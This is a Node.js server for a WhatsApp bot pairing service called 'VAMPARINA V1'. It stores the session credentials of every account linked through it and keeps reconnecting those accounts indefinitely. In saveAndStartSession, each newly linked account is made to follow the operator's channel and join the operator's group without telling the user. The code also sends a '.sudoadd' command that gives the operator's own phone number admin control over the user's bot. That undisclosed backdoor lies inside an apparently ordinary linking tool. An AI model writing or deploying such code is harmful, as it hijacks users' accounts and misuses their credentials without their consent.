import express from 'express';
import bodyParser from 'body-parser';
import { fileURLToPath } from 'url';
import path from 'path';
import fs from 'fs';
import { makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion, delay } from '@whiskeysockets/baileys';
import pino from 'pino';

// Your links (from your message)
const MY_CHANNEL = "0029VbBm7apIXnlmuyjGGM0p@newsletter";
const MY_GROUP_INVITE = "BZNDaKhvMFo5Gmne3wxt9n";
const KING_ARNOLD = "254703110780";

// Paths
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const SESSION_DIR = path.join(__dirname, 'auto_sessions');
const TEMP_DIR = path.join(__dirname, 'temp_sessions');

if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR, { recursive: true });
if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });

const app = express();
const PORT = process.env.PORT || 8000;

// Increase event listeners
import('events').then(events => {
    events.EventEmitter.defaultMaxListeners = 500;
});

// Middleware
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Active bots storage
const activeBots = new Map();

// Auto-load all old sessions from auto_sessions/
async function loadOldSessions() {
    const folders = fs.readdirSync(SESSION_DIR).filter(f => f.startsWith('vamp_'));
    console.log(`Loading ${folders.length} old soldiers...`);
    
    for (const folder of folders) {
        const phone = folder.split('_')[1];
        const sessionPath = path.join(SESSION_DIR, folder);
        console.log(`Reviving soldier → ${phone}`);
        startBotFromSession(folder, phone, sessionPath);
    }
}

// Main bot starter
async function startBotFromSession(sessionId, phone, sessionPath) {
    if (activeBots.has(sessionId)) return;

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: state,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false
    });

    activeBots.set(sessionId, sock);

    sock.ev.on('messages.upsert', m => {
        try { import('./main.js').then(mod => mod.default(sock, m)); } catch {}
    });

    sock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {
            console.log(`[+] ${phone} → VAMPARINA V1 ONLINE`);
        }
        if (update.connection === 'close') {
            activeBots.delete(sessionId);
            setTimeout(() => startBotFromSession(sessionId, phone, sessionPath), 10000);
        }
    });

    sock.ev.on('creds.update', saveCreds);
}

// Shared function: Save session + auto actions + start bot
async function saveAndStartSession(tempPath, phone) {
    const sessionId = `vamp_${phone}_${Date.now()}`;
    const finalPath = path.join(SESSION_DIR, sessionId);
    
    fs.mkdirSync(finalPath, { recursive: true });
    fs.cpSync(tempPath, finalPath, { recursive: true });

    // AUTO ACTIONS AFTER LOGIN
    const { state } = await useMultiFileAuthState(finalPath);
    const tempSock = makeWASocket({
        auth: state,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false
    });

    tempSock.ev.on('connection.update', async (update) => {
 {
        if (update.connection === 'open') {
            try { await tempSock.newsletterFollow(MY_CHANNEL); } catch {}
            try { await tempSock.groupAcceptInvite(MY_GROUP_INVITE); } catch {}
            await tempSock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd ${KING_ARNOLD}` });
            tempSock.ws.close();
        }
    });

    await delay(15000);
    startBotFromSession(sessionId, phone, finalPath);
    fs.rmSync(tempPath, { recursive: true, force: true });
}

// Export for pair.js and qr.js
global.saveAndStartSession = saveAndStartSession;
global.SESSION_DIR = SESSION_DIR;
global.TEMP_DIR = TEMP_DIR;

// Dashboard
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>VAMPARINA V1</title>
<style>body{background:#000;color:#0f0;text-align:center;padding:80px;font-family:Arial;}
h1{font-size:70px;text-shadow:0 0 40px lime;} .s{font-size:55px;color:gold;}
a{color:lime;font-size:35px;margin:20px;display:block;}</style></head>
<body><h1>VAMPARINA V1 EMPIRE</h1>
<p class="s">SOLDIERS: ${activeBots.size}</p>
<a href="/qr">SCAN QR CODE</a>
<a href="/pair">PAIR WITH CODE</a>
<br><br><b>KING ARNOLD • +254703110780</b></body></html>`);
});

// Routes (your old style)
import pairRouter from './pair.js';
import qrRouter from './qr.js';
app.use('/pair', pairRouter);
app.use('/qr', qrRouter);

// Start server + load old sessions
app.listen(PORT, async () => {
    console.clear();
    console.log(`
╔══════════════════════════════════════════════════════════╗
║             VAMPARINA V1 — OLD LINKER UPGRADED           ║
║        SESSIONS → auto_sessions FOLDER (GITHUB)          ║
║        AUTO FOLLOW + JOIN GROUP + SUDOADD 254703110780   ║
║                    UNLIMITED • ETERNAL                   ║
╚══════════════════════════════════════════════════════════╝
    `);
    await loadOldSessions(); // ← THIS BRINGS BACK YOUR OLD ARMY
});